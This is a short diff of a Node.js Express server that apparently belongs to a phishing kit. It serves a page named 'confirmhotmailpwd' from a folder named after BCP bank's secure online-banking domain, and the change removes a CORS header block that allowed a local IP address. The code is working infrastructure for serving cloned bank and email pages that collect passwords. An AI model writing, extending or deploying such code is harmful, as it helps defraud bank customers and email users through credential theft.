@@ -34,12 +34,6 @@ app.get('/confirmhotmailpwd',function(req,res) {
     res.sendFile(path.join(__dirname+'/bcpzonasegurabeta.viabcp.com/confirmhotmailpwd.html'));
   });   
 
-  app.use((req, res, next) => {
-    res.setHeader('Access-Control-Allow-Origin', 'http://192.168.0.7:8080');
-    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
-    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
-    next();
-  });  
  
 // Start the server
 // for deploy host is: 0.0.0.0 
